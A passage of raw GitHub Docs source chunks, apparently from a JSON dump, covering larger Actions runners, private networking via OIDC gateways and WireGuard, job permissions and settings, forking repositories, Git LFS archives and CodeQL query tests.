reusables.actions.about-enterprise-level-runner-groups %}\n- **For organization-level runner groups**: {% data reusables.actions.about-organization-level-runner-groups %}\n\nOnce a repository has access to {% data variables.actions.hosted_runner %}s, the {% data variables.actions.hosted_runner %}s can be added to workflow files. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.actions.runner-groups-org-navigation %}\n1. Select a runner group from either list on the page. Organization-level runner groups are listed at the top of the page, and enterprise-level runner groups are listed under \"Shared by the Enterprise.\"\n1. On the runner group page, under \"Repository access,\" select **All repositories** or **Selected repositories**. If you choose to grant access to specific repositories, click {% octicon \"gear\" aria-label=\"The Settings gear\" %}, then select the repositories you would like to grant access to from the list.\n\n{% warning %}\n\n**Warning**:\n\n{% data reusables.actions.hosted-runner-security %}\n\nFor more information, see \"AUTOTITLE.\"\n\n{% endwarning %}\n\n\n\nChanging the name of a {% data variables.actions.hosted_runner %}\n\n{% ifversion ghec %}\nYou can edit the name of your {% data variables.actions.hosted_runner %}s.\n\n- Changing the name of an", "Y2h1bmtfMl9pbmRleF8xOTM=": " organization runner\n- Changing the name of an enterprise runner\n\n\n\nChanging the name of an organization runner\n\n{% endif %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.organizations.settings-sidebar-actions-runners %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions.rename-larger-runner %}\n\n{% ifversion ghec %}\n\n\n\nChanging the name of an enterprise runner\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.policies-tab %}\n{% data reusables.enterprise-accounts.actions-tab %}\n{% data reusables.enterprise-accounts.actions-runners-tab %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions.rename-larger-runner %}\n{% endif %}\n\n\n\nConfiguring autoscaling for {% data variables.actions.hosted_runner %}s\n\nYou can control the maximum number of jobs allowed to run concurrently for specific runner sets. Setting this field to a higher value can help prevent workflows being blocked due to parallelism.\n\n{% ifversion ghec %}\n- Configuring autoscaling for an organization runner\n- Configuring autoscaling for an enterprise runner\n\n\n\nConfiguring autoscaling for an organization runner\n\n{% endif %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.organizations.settings-sidebar-actions-runners %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions.configure-autoscaling-for-larger-runners %}\n\n{% ifversion ghec %}\n\n\n\nConfiguring autoscaling for an enterprise runner\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.policies-tab %}\n{% data reusables.enterprise-accounts.actions-tab %}\n{% data reusables.enterprise-accounts.actions-runners-tab %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions.configure-autoscaling-for-larger-runners %}\n{% endif %}\n\n\n\nCreating static IP addresses for {% data variables.", "Y2h1bmtfM19pbmRleF8xOTM=": "actions.hosted_runner %}s\n\n{% note %}\n\n**Note:** To use static IP addresses, your organization must use {% data variables.product.prodname_ghe_cloud %}. {% data reusables.enterprise.link-to-ghec-trial %}\n\n{% endnote %}\n\nYou can enable static IP addresses for {% data variables.actions.hosted_runner %}s. When you do this, the {% data variables.actions.hosted_runner %}s are assigned static IP address ranges. By default, you can configure up to 10 different {% data variables.actions.hosted_runner %}s with IP ranges for your account. {% data reusables.actions.larger-runner-static-ip-contact-support %}\n\nThe number of available IP addresses in the assigned ranges does not restrict number of concurrent jobs specified for autoscaling. Within a runner pool, there is a load balancer which allows for high reuse of the IP addresses in the assigned ranges. This ensures your workflows can run concurrently at scale while each machine is assigned a static IP address.\n\n{% ifversion ghec %}\n\n- Creating static IP addresses for organization runners\n- Creating static IP addresses for enterprise runners\n\n\n\nCreating static IP addresses for organization runners\n\n{% endif %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.organizations.settings-sidebar-actions-runners %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions..networking-for-larger-runners %}\n\n{% ifversion ghec %}\n\n\n\nCreating static IP addresses for enterprise runners\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.policies-tab %}\n{% data reusables.enterprise-accounts.actions-tab %}\n{% data reusables.enterprise-accounts.actions-runners-tab %}\n{% data reusables.actions.select-a-larger-runner %}\n{% data reusables.actions..networking-for-larger-runners %}\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTQ=": "\n\nRunning jobs on your runner\n\n{% linux %}\n\n{% data reusables.actions.run-jobs-larger-runners %}\n\n{% endlinux %}\n\n{% windows %}\n\n{% data reusables.actions.run-jobs-larger-runners %}\n\n{% endwindows %}\n\n{% mac %}\n\nOnce your runner type has been defined, you can update your workflow YAML files to send jobs to runner instances for processing. To run jobs on macOS {% data variables.actions.hosted_runner %}s, update the `runs-on` key in your workflow YAML files to use one of the {% data variables.product.company_short %}-defined labels for macOS runners. For more information, see \"Available macOS {% data variables.actions.hosted_runner %}s.\"\n\n{% endmac %}\n\n{% mac %}\n\n\n\nAvailable macOS {% data variables.actions.hosted_runner %}s\n\nUse the labels in the table below to run your workflows on the corresponding macOS {% data variables.actions.hosted_runner %}.\n\n| Runner Size | Architecture| Processor (CPU)| Memory (RAM)  | Storage (SSD) | OS (YAML workflow label) |\n| --------------| --------------| -------------- | ------------- | ------------- | --------------------- |\n| Large | Intel| 12             | 30 GB         | 14 GB         | macos-latest-large, macos-12-large , macos-13-large[Beta] |\n| XLarge| arm64 (M1)|6 CPU and 8 GPU| 14 GB         | 14 GB        | macos-latest-xlarge[Beta], macos-13-xlarge[Beta]   |\n{% note %}\n\n**Note:** For macOS {% data variables.actions.hosted_runner %}s, the `-latest` runner label uses the macOS 12 runner image. For macOS Xlarge, the `-latest` runner label uses the macOS 13 runner image\n\n{% endnote %}\n\n{% endmac %}\n\n{% ifversion repository-actions-runners %}\n\n\n\nViewing available runners for a repository\n\n{% note %}\n\n**Note:** This feature is currently in beta and subject to change.\n\n{% endnote %}\n\n{% data reusables.actions.about-viewing-runner-list %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.repository-runners %}\n1. Review the list of available runners for the repository.\n{% data reusables.actions.copy-ru", "Y2h1bmtfMV9pbmRleF8xOTQ=": "nner-label %}\n\n{% data reusables.actions.actions-tab-new-runners-note %}\n\n{% endif %}\n\n{% linux %}\n\n\n\nUsing groups to control where jobs are run\n\n{% data reusables.actions.jobs.example-runs-on-groups %}\n\n{% endlinux %}\n\n{% windows %}\n\n\n\nUsing groups to control where jobs are run\n\n{% data reusables.actions.jobs.example-runs-on-groups %}\n\n{% endwindows %}\n\n{% linux %}\n\n\n\nUsing labels to control where jobs are run\n\nIn this example, a runner group is populated with Ubuntu 16-core runners, which have also been assigned the label `ubuntu-20.04-16core`. The `runs-on` key sends the job to any available runner with a matching label:\n\n```yaml\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n{% endlinux %}\n\n{% windows %}\n\n\n\nUsing labels to control where jobs are run\n\nIn this example, a runner group is populated with Windows 16-core runners, which have also been assigned the label `windows-2022-16core`. The `runs-on` key sends the job to any available runner with a matching label:\n\n```yaml\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: windows-2022-16core\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n{% endwindows %}\n\n{% mac %}\n\n\n\nTargeting macOS {% data variables.actions.hosted_runner %}s in a workflow\n\nTo run your workflows on macOS {% data variables.actions.hosted_runner %}s, set the value of the `runs-on` key to a label associated with a macOS {% data variables.actions.hosted_runner %}. For a list of macOS {% data variables.actions.hosted_runner %} labels, see \"Available macOS {% data variables.action", "Y2h1bmtfMl9pbmRleF8xOTQ=": "s.hosted_runner %}s.\"\n\nIn this example, the workflow uses a label that is associated with macOS XL runners, which is `macos-latest-xl -arm64`. The `runs-on` key sends the job to any available runner with a matching label:\n\n```yaml\nname: learn-github-actions-testing\non: [push]\njobs:\n  build:\n    runs-on: macos-13-xlarge\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test\n```\n\n{% endmac %}\n\n{% linux %}\n\n\n\nUsing labels and groups to control where jobs are run\n\n{% data reusables.actions.jobs.example-runs-on-labels-and-groups %}\n\n{% data reusables.actions.section-using-unique-names-for-runner-groups %}\n\n{% endlinux %}\n\n{% windows %}\n\n\n\nUsing labels and groups to control where jobs are run\n\n{% data reusables.actions.jobs.example-runs-on-labels-and-groups %}\n\n{% data reusables.actions.section-using-unique-names-for-runner-groups %}\n\n{% endwindows %}\n\n\n\nTroubleshooting {% data variables.actions.hosted_runner %}s\n\n{% linux %}\n\n{% data reusables.actions.larger-runners-troubleshooting-linux-windows %}\n\n{% endlinux %}\n\n{% windows %}\n\n{% data reusables.actions.larger-runners-troubleshooting-linux-windows %}\n\n{% endwindows %}\n\n{% mac %}\n\nBecause macOS arm64 does not support Node 12, macOS {% data variables.actions.hosted_runner %}s automatically use Node 16 to execute any JavaScript action written for Node 12. Some community actions may not be compatible with Node 16. If you use an action that requires a different Node version, you may need to manually install a specific version at runtime.\n\n{% endmac %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTU=": "\n\nAbout {% data variables.product.prodname_dotcom %}-hosted runners networking\n\n{% data reusables.actions.about-private-networking-github-hosted-runners %}\n\n There are a few different approaches you could take to configure this access, each with different advantages and disadvantages.\n\n\n\nUsing an API Gateway with OIDC\n\n{% data reusables.actions.private-networking-oidc-intro %} For more information, see \"AUTOTITLE.\"\n\n\n\nUsing WireGuard to create a network overlay\n\n{% data reusables.actions.private-networking-wireguard-intro %} For more information, see \"AUTOTITLE.\"\n\n{% ifversion actions-private-networking-azure-vnet %}\n\n\n\nUsing an Azure Virtual Network (VNET)\n\n{% data reusables.actions.private-networking-actions-azure-vnet-beta-note %}\n\n{% data reusables.actions.azure-vnet-injected-runners-intro %} For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTY=": "\n\nUsing an API gateway with OIDC\n\n{% data reusables.actions.private-networking-oidc-intro %}For example, you could run an API gateway on the edge of your private network that authenticates incoming requests with the OIDC token and then makes API requests on behalf of your workflow in your private network.\n\nThe following diagram gives an overview of this solution's architecture:\n\n!Diagram of an OIDC gateway architecture, starting with a {% data variables.product.prodname_actions %} runner and ending with a private network's private service.\n\nIt's important that you verify not just that the OIDC token came from {% data variables.product.prodname_actions %}, but that it came specifically from your expected workflows, so that other {% data variables.product.prodname_actions %} users aren't able to access services in your private network. You can use OIDC claims to create these conditions. For more information, see \"AUTOTITLE.\"\n\nThe main disadvantages of this approach are that you must implement the API gateway to make requests on your behalf, and you must run the gateway on the edge of your network.\n\nThe following advantages apply.\n\n- You don't need to configure any firewalls, or modify the routing of your private network.\n- The API gateway is stateless and scales horizontally to handle high availability and high throughput.\n\nFor more information, see a reference implementation of an API Gateway in the github/actions-oidc-gateway repository. This implementation requires customization for your use case and is not ready-to-run as-is). For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xOTc=": "\n\nUsing WireGuard to create a network overlay\n\n{% data reusables.actions.private-networking-wireguard-intro %}\n\nThere are various disadvantages to this approach:\n\n- To reach WireGuard running on your private service, you will need a well-known IP address and port that your workflow can reference: this can either be a public IP address and port, a port mapping on a network gateway, or a service that dynamically updates DNS.\n- WireGuard doesn't handle NAT traversal out of the box, so you'll need to identify a way to provide this service.\n- This connection is one-to-one, so if you need high availability or high throughput you'll need to build that on top of WireGuard.\n- You'll need to generate and securely store keys for both the runner and your private service. WireGuard uses UDP, so your network must support UDP traffic.\n\nThere are some advantages too, as you can run WireGuard on an existing server so you don't have to maintain separate infrastructure, and it's well supported on {% data variables.product.prodname_dotcom %}-hosted runners.\n\n\n\nExample: Configuring WireGuard\n\nThis example workflow configures WireGuard to connect to a private service.\n\nFor this example, the WireGuard instance running in the private network has this configuration:\n- Overlay network IP address of `192.168.1.1`\n- Public IP address and port of `1.2.3.4:56789`\n- Public key `examplepubkey1234...`\n\nThe WireGuard instance in the {% data variables.product.prodname_actions %} runner has this configuration:\n- Overlay network IP address of `192.168.1.2`\n- Private key stores as an {% data variables.product.prodname_actions %} secret under `WIREGUARD_PRIVATE_KEY`\n\n```yaml\nname: WireGuard example\n\non:\n  workflow_dispatch:\n\njobs:\n  wireguard_example:\n    runs-on: ubuntu-latest\n    steps:\n      - run: sudo apt install wireguard\n\n      - run: echo \"${{ secrets.WIREGUARD_PRIVATE_KEY }}\" > privatekey\n\n      - run: sudo ip link add dev wg0 type wireguard\n\n      - run: sudo ip address add dev wg0 192.168.1.2 peer 192.168.1.1\n\n      - run: sudo wg set wg0 l", "Y2h1bmtfMV9pbmRleF8xOTc=": "isten-port 48123 private-key privatekey peer examplepubkey1234... allowed-ips 0.0.0.0/0 endpoint 1.2.3.4:56789\n\n      - run: sudo ip link set up dev wg0\n\n      - run: curl -vvv http://192.168.1.1\n```\n\nFor more information, see WireGuard's Quick Start, as well as \"AUTOTITLE\" for how to securely store keys.\n\n\n\nUsing Tailscale to create a network overlay\n\nTailscale is a commercial product built on top of WireGuard. This option is very similar to WireGuard, except Tailscale is more of a complete product experience instead of an open source component.\n\nIts disadvantages are similar to WireGuard: The connection is one-to-one, so you might need to do additional work for high availability or high throughput. You still need to generate and securely store keys. The protocol is still UDP, so your network must support UDP traffic.\n\nHowever, there are some advantages over WireGuard: NAT traversal is built-in, so you don't need to expose a port to the public internet. It is by far the quickest of these options to get up and running, since Tailscale provides an {% data variables.product.prodname_actions %} workflow with a single step to connect to the overlay network.\n\nFor more information, see the Tailscale GitHub Action, as well as \"AUTOTITLE\" for how to securely store keys.\n\n", "Y2h1bmtfMF9pbmRleF8xOTg=": "\n\nOverview\n\n{% data reusables.actions.jobs.section-assigning-permissions-to-jobs %}\n\n\n\nDefining access for the `GITHUB_TOKEN` scopes\n\n{% data reusables.actions.github-token-available-permissions %}\n\n\n\nChanging the permissions in a forked repository\n\n{% data reusables.actions.forked-write-permission %}\n\n\n\nSetting the `GITHUB_TOKEN` permissions for all jobs in a workflow\n\nYou can specify `permissions` at the top level of a workflow, so that the setting applies to all jobs in the workflow.\n\n\n\nExample: Setting the `GITHUB_TOKEN` permissions for an entire workflow\n\n{% data reusables.actions.jobs.setting-permissions-all-jobs-example %}\n\n\n\nSetting the `GITHUB_TOKEN` permissions for a specific job\n\n{% data reusables.actions.jobs.section-assigning-permissions-to-jobs-specific %}\n\n\n\nExample: Setting the `GITHUB_TOKEN` permissions for one job in a workflow\n\n{% data reusables.actions.jobs.setting-permissions-specific-jobs-example %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTk=": "\n\nOverview\n\n{% data reusables.actions.jobs.section-choosing-the-runner-for-a-job %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDA=": "\n\nOverview\n\n{% data reusables.actions.jobs.section-defining-outputs-for-jobs %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDE=": "\n\nOverview\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container %}\n\n\n\nDefining the container image\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-image %}\n\n\n\nDefining credentials for a container registry\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-credentials %}\n\n\n\nUsing environment variables with a container\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-env %}\n\n\n\nExposing network ports on a container\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-ports %}\n\n\n\nMounting volumes in a container\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-volumes %}\n\n\n\nSetting container resource options\n\n{% data reusables.actions.jobs.section-running-jobs-in-a-container-options %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDI=": "\n\nOverview\n\n{% data reusables.actions.jobs.setting-default-values-for-jobs-defaults %}\n\n\n\nSetting default shell and working directory\n\n{% data reusables.actions.jobs.setting-default-values-for-jobs-defaults-run %}\n\n\n\nSetting default values for a specific job\n\n{% data reusables.actions.jobs.setting-default-values-for-jobs-defaults-job %}\n\n\n\nSetting default shell and working directory for a job\n\n{% data reusables.actions.jobs.setting-default-values-for-jobs-defaults-job-run %}\n\n\n\nExample: Setting default `run` step options for a job\n\n{% data reusables.actions.jobs.setting-default-run-value-for-job-example %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDM=": "\n\nAbout matrix strategies\n\n{% data reusables.actions.jobs.about-matrix-strategy %}\n\n\n\nUsing a matrix strategy\n\n{% data reusables.actions.jobs.using-matrix-strategy %}\n\n\n\nExample: Using a single-dimension matrix\n\n{% data reusables.actions.jobs.single-dimension-matrix %}\n\n\n\nExample: Using a multi-dimension matrix\n\n{% data reusables.actions.jobs.multi-dimension-matrix %}\n\n\n\nExample: Using contexts to create matrices\n\n{% data reusables.actions.jobs.matrix-from-context %}\n\n\n\nExpanding or adding matrix configurations\n\n{% data reusables.actions.jobs.matrix-include %}\n\n\n\nExample: Expanding configurations\n\n{% data reusables.actions.jobs.matrix-expand-with-include %}\n\n\n\nExample: Adding configurations\n\n{% data reusables.actions.jobs.matrix-add-with-include %}\n\n\n\nExcluding matrix configurations\n\n{% data reusables.actions.jobs.matrix-exclude %}\n\n\n\nHandling failures\n\n{% data reusables.actions.jobs.section-using-a-build-matrix-for-your-jobs-failfast %}\n\n\n\nDefining the maximum number of concurrent jobs\n\n{% data reusables.actions.jobs.section-using-a-build-matrix-for-your-jobs-max-parallel %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDQ=": "\n\nOverview\n\nBy default, {% data variables.product.prodname_actions %} allows multiple jobs within the same workflow, multiple workflow runs within the same repository, and multiple workflow runs across a repository owner's account to run concurrently. This means that multiple workflow runs, jobs, or steps can run at the same time.\n\n{% data variables.product.prodname_actions %} also allows you to control the concurrency of workflow runs, so that you can ensure that only one run, one job, or one step runs at a time in a specific context. This can be useful for controlling your account's or organization's resources in situations where running multiple workflows, jobs, or steps at the same time could cause conflicts or consume more Actions minutes and storage than expected.\n\nFor example, the ability to run workflows concurrently means that if multiple commits are pushed to a repository in quick succession, each push could trigger a separate workflow run, and these runs will execute concurrently.\n\n\n\nUsing concurrency in different scenarios\n\n{% data reusables.actions.jobs.section-using-concurrency-jobs %}\n\n{% ifversion github-runner-dashboard %}\n\n\n\nMonitoring your current jobs in your organization or enterprise\n\n{% data reusables.actions.github-hosted-runners-check-concurrency %}\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDU=": "\n\nOverview\n\n{% data reusables.actions.workflows.skipped-job-status-checks-passing %}\n\n{% data reusables.actions.jobs.section-using-conditions-to-control-job-execution %}\n\nOn a skipped job, you should see \"This check was skipped.\"\n\n{% note %}\n\n**Note:** In some parts of the workflow you cannot use environment variables. Instead you can use contexts to access the value of an environment variable. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n", "Y2h1bmtfMF9pbmRleF8xMjgw": "\n\nAbout forks\n\n{% data reusables.repositories.fork-definition-long %}  For more information, see \"AUTOTITLE.\"\n\n\n\nPropose changes to someone else's project\n\nFor example, you can use forks to propose changes related to fixing a bug. Rather than logging an issue for a bug you have found, you can:\n\n- Fork the repository.\n- Make the fix.\n- Submit a pull request to the project owner.\n\n\n\nUse someone else's project as a starting point for your own idea.\n\nOpen source software is based on the idea that by sharing code, we can make better, more reliable software. For more information, see the \"About the Open Source Initiative\" on the Open Source Initiative.\n\nFor more information about applying open source principles to your organization's development work on {% data variables.location.product_location %}, see {% data variables.product.prodname_dotcom %}'s white paper \"An introduction to innersource.\"\n\n{% ifversion fpt or ghes or ghec %}\n\nWhen creating your public repository from a fork of someone's project, make sure to include a license file that determines how you want your project to be shared with others. For more information, see \"Choose an open source license\" at choosealicense.com.\n\n{% data reusables.open-source.open-source-guide-repositories %} {% data reusables.open-source.open-source-learning %}\n\n{% endif %}\n\n\n\nPrerequisites\n\nIf you haven't yet, first set up Git and authentication with {% data variables.location.product_location %} from Git. For more information, see \"AUTOTITLE.\"\n\n\n\nForking a repository\n\n{% webui %}\n\nYou might fork a project to propose changes to the upstream repository. In this case, it's good practice to regularly sync your fork with the upstream repository. To do this, you'll need to use Git on the command line. You can practice setting the upstream repository using the same octocat/Spoon-Knife repository you just forked.\n\n1. On {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom_the_website %}{% else %}{% data variables.location.product_location %}{% endif %}, navigate to the ", "Y2h1bmtfMV9pbmRleF8xMjgw": "octocat/Spoon-Knife repository.\n1. In the top-right corner of the page, click **Fork**.\n\n   !Screenshot of the main page of repository. A button, labeled with a fork icon and \"Fork 59.3k,\" is outlined in dark orange.\n{%- ifversion fpt or ghec or ghes or ghae > 3.5 %}\n1. Under \"Owner,\" select the dropdown menu and click an owner for the forked repository.\n1. By default, forks are named the same as their upstream repositories. Optionally, to further distinguish your fork, in the \"Repository name\" field, type a name.\n1. Optionally, in the \"Description\" field, type a description of your fork.\n{%- ifversion fpt or ghec or ghes or ghae > 3.6 %}\n1. Optionally, select **Copy the DEFAULT branch only**.\n\n   For many forking scenarios, such as contributing to open-source projects, you only need to copy the default branch. If you do not select this option, all branches will be copied into the new fork.\n{%- endif %}\n1. Click **Create fork**.\n\n{% note %}\n\n**Note:** If you want to copy additional branches from the upstream repository, you can do so from the **Branches** page. For more information, see \"AUTOTITLE.\"{% endnote %}{% endif %}\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo create a fork of a repository, use the `gh repo fork` subcommand.\n\n```shell\ngh repo fork REPOSITORY\n```\n\nTo create the fork in an organization, use the `--org` flag.\n\n```shell\ngh repo fork REPOSITORY --org \"octo-org\"\n```\n\n{% endcli %}\n\n{% desktop %}\n\nYou can fork a repository on {% data variables.product.prodname_dotcom_the_website %} or in {% data variables.product.prodname_desktop %}. For information about forking on {% data variables.product.prodname_dotcom_the_website %}, see the web browser version of this article.\n\n{% data reusables.desktop.forking-a-repo %}\n\n{% enddesktop %}\n\n\n\nCloning your forked repository\n\nRight now, you have a fork of the Spoon-Knife repository, but you do not have the files in that repository locally on your computer.\n\n{% webui %}\n\n1. On {% ifversion fpt or ghec %}{% data variables.product.prodn", "Y2h1bmtfMl9pbmRleF8xMjgw": "ame_dotcom_the_website %}{% else %}{% data variables.location.product_location %}{% endif %}, navigate to **your fork** of the Spoon-Knife repository.\n{% data reusables.repositories.copy-clone-url %}\n{% data reusables.command_line.open_the_multi_os_terminal %}\n{% data reusables.command_line.change-current-directory-clone %}\n1. Type `git clone`, and then paste the URL you copied earlier. It will look like this, with your {% data variables.product.product_name %} username instead of `YOUR-USERNAME`:\n\n   ```shell\n   git clone https://{% data variables.command_line.codeblock %}/YOUR-USERNAME/Spoon-Knife\n   ```\n\n1. Press **Enter**. Your local clone will be created.\n\n   ```shell\n   $ git clone https://{% data variables.command_line.codeblock %}/YOUR-USERNAME/Spoon-Knife\n   > Cloning into `Spoon-Knife`...\n   > remote: Counting objects: 10, done.\n   > remote: Compressing objects: 100% (8/8), done.\n   > remote: Total 10 (delta 1), reused 10 (delta 1)\n   > Unpacking objects: 100% (10/10), done.\n   ```\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo create a clone of your fork, use the `--clone` flag.\n\n```shell\ngh repo fork REPOSITORY --clone=true\n```\n\n{% endcli %}\n\n{% desktop %}\n\n{% data reusables.desktop.choose-clone-repository %}\n{% data reusables.desktop.cloning-location-tab %}\n{% data reusables.desktop.cloning-repository-list %}\n{% data reusables.desktop.choose-local-path %}\n{% data reusables.desktop.click-clone %}\n\n{% enddesktop %}\n\n\n\nConfiguring Git to sync your fork with the upstream repository\n\nWhen you fork a project in order to propose changes to the upstream repository, you can configure Git to pull changes from the upstream repository into the local clone of your fork.\n\n{% webui %}\n\n1. On {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom_the_website %}{% else %}{% data variables.location.product_location %}{% endif %}, navigate to the octocat/Spoon-Knife repository.\n{% data reusables.repositories.copy-clone-url %}\n{% data reusables.command_line.open_the_multi_os_termin", "Y2h1bmtfM19pbmRleF8xMjgw": "al %}\n1. Change directories to the location of the fork you cloned.\n    - To go to your home directory, type just `cd` with no other text.\n    - To list the files and folders in your current directory, type `ls`.\n    - To go into one of your listed directories, type `cd your_listed_directory`.\n    - To go up one directory, type `cd ..`.\n1. Type `git remote -v` and press **Enter**. You will see the current configured remote repository for your fork.\n\n   ```shell\n   $ git remote -v\n   > origin  https://{% data variables.command_line.codeblock %}/YOUR_USERNAME/YOUR_FORK.git (fetch)\n   > origin  https://{% data variables.command_line.codeblock %}/YOUR_USERNAME/YOUR_FORK.git (push)\n   ```\n\n1. Type `git remote add upstream`, and then paste the URL you copied in Step 3 and press **Enter**. It will look like this:\n\n   ```shell\n   git remote add upstream https://{% data variables.command_line.codeblock %}/ORIGINAL_OWNER/Spoon-Knife.git\n   ```\n\n1. To verify the new upstream repository you have specified for your fork, type `git remote -v` again. You should see the URL for your fork as `origin`, and the URL for the upstream repository as `upstream`.\n\n   ```shell\n   $ git remote -v\n   > origin    https://{% data variables.command_line.codeblock %}/YOUR_USERNAME/YOUR_FORK.git (fetch)\n   > origin    https://{% data variables.command_line.codeblock %}/YOUR_USERNAME/YOUR_FORK.git (push)\n   > upstream  https://{% data variables.command_line.codeblock %}/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git (fetch)\n   > upstream  https://{% data variables.command_line.codeblock %}/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git (push)\n   ```\n\nNow, you can keep your fork synced with the upstream repository with a few Git commands. For more information, see \"AUTOTITLE.\"\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo configure a remote repository for the forked repository, use the `--remote` flag.\n\n```shell\ngh repo fork REPOSITORY --remote=true\n```\n\nTo specify the remote repository's name, use the `--remote-name` flag.\n\n```shell\ngh ", "Y2h1bmtfNF9pbmRleF8xMjgw": "repo fork REPOSITORY --remote-name \"main-remote-repo\"\n```\n\n{% endcli %}\n\n\n\nEditing a fork\n\nYou can make any changes to a fork, including:\n\n- **Creating branches:** _Branches_ allow you to build new features or test out ideas without putting your main project at risk.\n- **Opening pull requests:** If you want to contribute back to the upstream repository, you can send a request to the original author to pull your fork into their repository by submitting a pull request.\n\n\n\nFind another repository to fork\n\nFork a repository to start contributing to a project. {% data reusables.repositories.you-can-fork %} For more information about when you can fork a repository, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}You can browse Explore {% data variables.product.prodname_dotcom %} to find projects and start contributing to open source repositories. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nNext Steps\n\nYou have now forked a repository, practiced cloning your fork, and configured an upstream repository.\n\n- For more information about cloning the fork and syncing the changes in a forked repository from your computer, see \"AUTOTITLE.\"\n\n- You can also create a new repository where you can put all your projects and share the code on {% data variables.product.prodname_dotcom %}. {% data reusables.getting-started.create-a-repository %}\"\n\n- {% data reusables.getting-started.being-social %}\n\n- {% data reusables.support.connect-in-the-forum-bootcamp %}\n\n", "Y2h1bmtfMF9pbmRleF8xNzY4": "\n\nAbout {% data variables.large_files.product_name_short %} objects in archives\n\n{% data variables.product.product_name %} creates source code archives of your repository in the form of ZIP files and tarballs. People can download these archives on the main page of your repository or as release assets. By default, {% data variables.large_files.product_name_short %} objects are not included in these archives, only the pointer files to these objects. To improve the usability of archives for your repository, you can choose to include the {% data variables.large_files.product_name_short %} objects instead. To be included, the {% data variables.large_files.product_name_short %} objects must be covered by tracking rules in a _.gitattributes_ file that has been committed to the repository.\n\nIf you choose to include {% data variables.large_files.product_name_short %} objects in archives of your repository, every download of those archives will count towards bandwidth usage for your account. Each account receives {% data variables.large_files.initial_bandwidth_quota %} per month of bandwidth for free, and you can pay for additional usage. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\nIf you use an external LFS server (configured in your _.lfsconfig_), those LFS files will not be included in archives of the repository. The archive will only contain files that have been committed to {% data variables.product.product_name %}.\n\n\n\nManaging {% data variables.large_files.product_name_short %} objects in archives\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n1. Under \"Archives\", select or deselect **Include {% data variables.large_files.product_name_short %} objects in archives**.\n\n", "Y2h1bmtfMF9pbmRleF84NzA=": "\n\nAbout testing custom queries\n\n{% data variables.product.prodname_codeql %} provides a simple test framework for automated regression testing\nof queries. Test your queries to ensure that they behave as expected.\n\nDuring a query test, {% data variables.product.prodname_codeql %} compares the results the user expects\nthe query to produce with those actually produced. If the expected and\nactual results differ, the query test fails. To fix the test, you should iterate\non the query and the expected results until the actual results and the expected\nresults exactly match. This topic shows you how to create test files and execute\ntests on them using the `test run` subcommand.\n\n\n\nSetting up a test {% data variables.product.prodname_codeql %} pack for custom queries\n\nAll {% data variables.product.prodname_codeql %} tests must be stored in a special \"test\" {% data variables.product.prodname_codeql %} pack. That is, a directory for test files with a `qlpack.yml` file that defines:\n\n```yaml\nname: \nversion: 0.0.0\ndependencies:\n  : \"*\"\nextractor: \n```\n\nThe `dependencies` value specifies the {% data variables.product.prodname_codeql %} packs containing queries to test.\nTypically, these packs will be resolved from source, and so it is not necessary\nto specify a fixed version of the pack. The `extractor` defines which language the CLI will use to create test databases from the 